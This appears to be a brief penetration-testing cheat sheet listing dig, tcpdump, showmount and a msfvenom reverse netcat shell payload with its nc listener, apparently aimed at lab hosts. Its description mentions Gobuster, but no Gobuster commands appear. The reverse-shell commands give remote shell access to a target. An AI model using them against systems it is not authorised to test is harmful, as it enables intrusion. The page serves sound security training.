---
title: Cli Commands Collation
description:Penetration Tests CheatSheet - In this CheatSheet, you will find a series of practical example commands for running Gobuster and getting the most of this powerful tool.
template: comments.html
tags: [pt, penetration-testing, cli, commands, collation]
---

# Cli Commands Collation

## Find PTR Owner - Reversal Look Up

```bash
dig 0.168.192.in-addr.arpa. NS
```

## Listent for Ping/icmp on interface

```bash
sudo tcpdump ip proto \\icmp -i eth0
```

## Reverse Netcat Shell

Payload R(row)

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.11.19.49 lport=4444 R
```

listener:

```bash
nc -lvp 4444
```

## NFS Show Mount

```bash
showmount -e 10.10.87.232
```
